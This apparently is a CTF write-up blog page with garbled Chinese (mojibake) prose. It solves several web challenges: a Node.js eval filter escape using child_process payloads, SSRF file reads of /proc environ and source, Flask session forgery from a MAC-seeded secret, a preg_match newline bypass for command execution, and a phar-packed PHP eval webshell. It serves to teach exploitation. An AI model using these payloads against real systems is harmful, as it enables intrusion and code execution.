<p>å°å†™å¾—æ˜¯adminå¤§å†™å¾—æ˜¯ADMINã€‚è€ƒç‚¹æ˜¯toUpperCaseå‡½æ•°è¿›è¡Œå¤§å†™è½¬æ¢çš„æ—¶å€™å­˜åœ¨æ¼æ´ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦<code>Ä±</code>ä¼šå˜æˆ<code>I</code><br>è¿™ä¸¤ä¸ªå­—ç¬¦çš„â€œå¤§å†™â€æ˜¯Iå’ŒSã€‚ä¹Ÿå°±æ˜¯è¯´â€Ä±â€.toUpperCase() &#x3D;&#x3D; â€˜Iâ€™ï¼Œâ€œÅ¿â€.toUpperCase() &#x3D;&#x3D; â€˜Sâ€™ã€‚é€šè¿‡è¿™ä¸ªå°ç‰¹æ€§å¯ä»¥ç»•è¿‡ä¸€äº›é™åˆ¶<br>åŒæ ·çš„â€â„ªâ€çš„â€œå°å†™â€å­—ç¬¦æ˜¯kï¼Œä¹Ÿå°±æ˜¯â€â„ªâ€.toLowerCase() &#x3D;&#x3D; â€˜kâ€™.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åœ¨Character.toUpperCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œå­—ç¬¦Å¿ä¼šå˜ä¸ºSã€‚</span><br><span class="line">åœ¨Character.toLowerCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä°ä¼šè½¬å˜ä¸ºiï¼Œå­—ç¬¦â„ªä¼šè½¬å˜ä¸ºkã€‚</span><br></pre></td></tr></table></figure>

<p>admÄ±n&#x2F;admin123</p>
<p>æˆåŠŸå¯¹æ¥</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722101811761.png" alt="image-20240722101811761"></p>
<p>æºç åœ¨f12ä¸­å¯ä»¥çœ‹åˆ°</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = req.<span class="property">body</span>.<span class="property">calc</span>;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.<span class="property">split</span><span class="string">``</span>.<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.<span class="title function_">slice</span>(i + <span class="number">1</span>, calc.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æˆªå–</span></span><br><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="comment">//å»ç©º</span></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°æ˜çš„åŒå­¦è¿‡æ»¤äº†ä¸€äº›æ¯”è¾ƒå±é™©çš„ä¸œè¥¿</span></span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;sh&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;ln&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;ln&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;fs&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;fs&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;x&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="built_in">eval</span>(calc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>eval(calc)äº§ç”Ÿå‘½ä»¤æ‰§è¡Œ</p>
<p>ä½†æ˜¯sliceæ˜¯ä»ç¬¬å››çš„å…ƒç´ å¼€å§‹æ›¿æ¢ï¼Œå­˜åœ¨é€»è¾‘é—®é¢˜ï¼Œå¯ä»¥é€ƒé€¸å‰å››ä¸ªå­—ç¬¦ï¼ˆä»»æ„å€¼ï¼‰ï¼Œä¼šå‘ç°å¯ä»¥ç»•è¿‡è¿™ä¸ªåˆ¤æ–­å®ç°é€ƒé€¸</p>
<p>ç¦æ­¢äº† <code>x</code> ä¸èƒ½æœ‰<code>exec</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(&quot;child_process&quot;).spawn(&#x27;sleep&#x27;, [&#x27;3&#x27;]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722103234648.png" alt="image-20240722103234648"></p>
<p>å°è¯•è¯»å–æ–‡ä»¶ï¼Œæ²¡æœ‰å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$IFS$9/G*&#x27;).toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<p>å†™å…¥é™æ€æ–‡ä»¶è¯»å–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$IFS$9/G*&gt;a&#x27;).toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<h2 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p>ä¸‰ä¸ªæŒ‰é’®ï¼Œä¸€ä¸ªä¸ªæ¥</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722190813787.png" alt="image-20240722190813787"></p>
<p>è¯»å–ï¼Œphpä¼ªåè®®ç›´æ¥è¯»ï¼Œè¯»flgaå’Œapp.pyæ—¶æœ‰è¿‡æ»¤</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722190752517.png" alt="image-20240722190752517"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722190930204.png" alt="image-20240722190930204"></p>
<p>è¯»å–ç¯å¢ƒå˜é‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28745/read?url=file:///proc/1/environ</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722191042710.png" alt="image-20240722191042710"></p>
<p>æ— ç–‘æ˜¯éé¢„æœŸè§£ï¼Œè¿™é‡Œè¦è·å–æºç </p>
<p>urllib.request.urlopen<code>å¯ä»¥ç›´æ¥æ¥å—urlencodeçš„è·¯å¾„, ä½†æ˜¯è¯»æœ¬åœ°æ–‡ä»¶æ—¶æœ€å‰é¢çš„</code>&#x2F;<code>è¦ä¿ç•™, ä¸èƒ½ç¼–ç ä¸º</code>%2F</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å¯¹&#x2F;app&#x2F;app.pyè¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼Œç¬¬ä¸€ä¸ª<code>/</code>ä¸èƒ½ç¼–ç </p>
<p>å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%25%36%31%25%37%30%25%37%30%25%32%46%25%36%31%25%37%30%25%37%30%25%32%45%25%37%30%25%37%39</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722191557128.png" alt="image-20240722191557128"></p>
<p>è®¿é—®åå¾—åˆ°æºç </p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240722191619330.png" alt="image-20240722191619330"></p>
<p>ç„¶åå°±æ˜¯ç†Ÿæ‚‰çš„sessionä¼ªé€ </p>
<p>é¦–å…ˆæ‰¾åˆ°secretç”Ÿæˆæ–¹å¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br></pre></td></tr></table></figure>

<p>è¯»mac</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwdç”¨æ¥åˆ¤æ–­è¯»å–æ¼æ´çš„å­˜åœ¨</span><br><span class="line">/etc/environmentæ˜¯ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶ä¹‹ä¸€ã€‚ç¯å¢ƒå˜é‡å¯èƒ½å­˜åœ¨å¤§é‡ç›®å½•ä¿¡æ¯çš„æ³„éœ²ï¼Œç”šè‡³å¯èƒ½å‡ºç°secret keyæ³„éœ²çš„æƒ…å†µã€‚</span><br><span class="line">/etc/hostname/etc/hostnameè¡¨ç¤ºä¸»æœºåã€‚</span><br><span class="line">/etc/issueæŒ‡æ˜ç³»ç»Ÿç‰ˆæœ¬ã€‚</span><br><span class="line">/procç›®å½•</span><br><span class="line">/proc/[pid]æŸ¥çœ‹è¿›ç¨‹</span><br><span class="line">/proc/selfæŸ¥çœ‹å½“å‰è¿›ç¨‹</span><br><span class="line">/proc/self/cmdlineå½“å‰è¿›ç¨‹å¯¹åº”çš„ç»ˆç«¯å‘½ä»¤</span><br><span class="line">/proc/self/pwdç¨‹åºè¿è¡Œç›®å½•</span><br><span class="line">/proc/self/ç¯å¢ƒå˜é‡</span><br><span class="line">/sys/class/net/eth0/address macåœ°å€ä¿å­˜ä½</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722192346256.png" alt="image-20240722192346256"></p>
<p>ç”Ÿæˆsecret</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    random.seed(<span class="number">0x0242ac02a812</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">207.12851557558668</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722193916810.png" alt="image-20240722193916810"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;&quot; -s  &quot;62.6539852098&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722194312461.png" alt="image-20240722194312461"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722195318126.png" alt="image-20240722195318126"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722194615829.png" alt="image-20240722194615829"></p>
<p>ä¸Šä¼ åé€šè¿‡&#x2F;boogipopè·¯ç”±å»è®¿é—®å“åº”æ–‡ä»¶å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28540/boogipop?file=uploads/1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722200622404.png" alt="image-20240722200622404"></p>
<h2 id="FBCTF-2019-rceservice"><a href="#FBCTF-2019-rceservice" class="headerlink" title="[FBCTF 2019]rceservice"></a>[FBCTF 2019]rceservice</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªç‚¹</p>
<ul>
<li>preg_matchç»•è¿‡</li>
</ul>
<p>%0aæ¢è¡Œæ¥ç»•è¿‡ï¼Œpreg_matchåªèƒ½åŒ¹é…ç¬¬ä¸€è¡Œ</p>
<ul>
<li>catè¢«è¿‡æ»¤</li>
</ul>
<p>&#x2F;bin&#x2F;catè¿›è¡Œç»•è¿‡<br>å†ç”¨jsonçš„æ ¼å¼å°è£…èµ·æ¥</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	%0a&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-bingdundun"><a href="#NISACTF-2022-bingdundun" class="headerlink" title="[NISACTF 2022]bingdundun~"></a>[NISACTF 2022]bingdundun~</h2><p>åŸºç¡€çš„pharååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&lt;?php eval($_POST[&quot;1&quot;]); ?&gt;&#x27;</span>; <span class="comment">//ä¸€å¥è¯æœ¨é©¬</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;example.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;67.php&quot;</span>, <span class="string">&quot;<span class="subst">$payload</span>&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">// $phar-&gt;setMetadata(...); //åœ¨metadataæ·»åŠ å†…å®¹ï¼Œå¯å‚è€ƒ pharååºåˆ—åŒ–ï¼Œæ­¤å¤„ç”¨ä¸ç€ï¼Œæ•…æ³¨é‡Š</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723110949181.png" alt="image-20240723110949181"></p>
<p>ä¸Šä¼ åç›´æ¥è®¿é—®å¯¹åº”çš„å‹ç¼©è¿›å»çš„phpå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:20355/?bingdundun=phar://0551e3d7f50fe9b53c54c885e264a5d1.zip/67</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240723111013991.png" alt="image-20240723111013991"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723111109017.png" alt="image-20240723111109017"></p>
<p>67æ˜¯åˆ›å»ºçš„æ—¶å€™å‹ç¼©è¿›å»çš„ï¼Œè‡ªåŠ¨è¡¥å…¨åç¼€</p>
